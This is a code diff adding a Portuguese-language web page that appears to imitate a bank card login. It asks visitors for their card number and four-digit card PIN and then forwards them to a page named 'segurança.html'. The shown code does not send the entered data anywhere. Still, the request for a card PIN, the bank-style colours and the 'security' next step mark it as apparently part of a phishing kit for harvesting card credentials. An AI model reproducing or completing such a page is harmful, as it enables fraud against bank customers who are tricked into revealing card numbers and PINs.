@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cartão</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('foto/fundo.JPEG') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      position: absolute;
+      bottom: 100px;
+      width: calc(100% - 40px); /* Afasta das laterais */
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #0031d3;
+      padding: 20px;
+      box-sizing: border-box;
+      border-radius: 20px; /* Arredondado em todas as bordas */
+      max-width: 500px; /* Limita a largura máxima */
+    }
+
+    .label {
+      color: white;
+      font-size: 16px;
+      margin-bottom: 5px;
+    }
+
+    .input-cartao {
+      width: 100%;
+      padding: 10px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+    }
+
+    .senha-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: white;
+      padding: 10px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+
+    .senha-circulos {
+      display: flex;
+      gap: 10px;
+    }
+
+    .circulo {
+      width: 15px;
+      height: 15px;
+      border-radius: 50%;
+      background-color: black;
+      opacity: 0;
+      transition: opacity 0.2s; /* Suaviza a transição */
+    }
+
+    .circulo.ativo {
+      opacity: 0.3;
+    }
+
+    .circulo.preenchido {
+      opacity: 1;
+    }
+
+    .cadeado {
+      font-size: 20px;
+      color: black;
+      filter: grayscale(100%);
+    }
+
+    .btn-acessar {
+      width: 100%;
+      margin-top: 20px;
+      padding: 12px;
+      font-size: 18px;
+      background-color: #ff6201;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: normal;
+      cursor: pointer;
+    }
+
+    input[type="password"] {
+      opacity: 0;
+      position: absolute;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="label">Número do cartão</div>
+    <input type="text" maxlength="19" class="input-cartao" id="cartao" placeholder="5555 5555 5555 5555">
+
+    <div class="label">Senha do cartão</div>
+    <div class="senha-container" id="senhaContainer">
+      <div class="senha-circulos">
+        <div class="circulo" id="dot1"></div>
+        <div class="circulo" id="dot2"></div>
+        <div class="circulo" id="dot3"></div>
+        <div class="circulo" id="dot4"></div>
+      </div>
+      <div class="cadeado">🔒</div>
+    </div>
+
+    <input type="password" maxlength="4" id="senha" inputmode="numeric" pattern="[0-9]*">
+
+    <button class="btn-acessar" onclick="window.location.href='segurança.html'">Acessar</button>
+  </div>
+
+  <script>
+    // Formata o número do cartão ao digitar
+    document.getElementById('cartao').addEventListener('input', function(e) {
+      let valor = e.target.value.replace(/\D/g, '').substring(0, 16);
+      let formatado = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
+      e.target.value = formatado;
+    });
+
+    // Mostra os pontos da senha conforme digita
+    const senhaInput = document.getElementById('senha');
+    const senhaContainer = document.getElementById('senhaContainer');
+    const dots = [
+      document.getElementById('dot1'),
+      document.getElementById('dot2'),
+      document.getElementById('dot3'),
+      document.getElementById('dot4')
+    ];
+
+    // Mostra os círculos apenas quando clicar no container
+    senhaContainer.addEventListener('click', () => {
+      // Mostra todos os círculos (transparentes inicialmente)
+      dots.forEach(dot => {
+        dot.classList.add('ativo');
+        dot.classList.remove('preenchido');
+      });
+      
+      // Foca no campo de senha
+      senhaInput.focus();
+    });
+
+    // Atualiza os pontos conforme digita
+    senhaInput.addEventListener('input', function () {
+      const valor = senhaInput.value;
+      dots.forEach((dot, index) => {
+        if (index < valor.length) {
+          dot.classList.add('preenchido');
+        } else {
+          dot.classList.remove('preenchido');
+        }
+      });
+    });
+
+    // Esconde os pontos quando clicar fora
+    document.addEventListener('click', function(e) {
+      if (!senhaContainer.contains(e.target) && e.target !== senhaInput) {
+        if (senhaInput.value.length === 0) {
+          dots.forEach(dot => {
+            dot.classList.remove('ativo');
+            dot.classList.remove('preenchido');
+          });
+        }
+      }
+    });
+  </script>
+
+</body>
+</html>
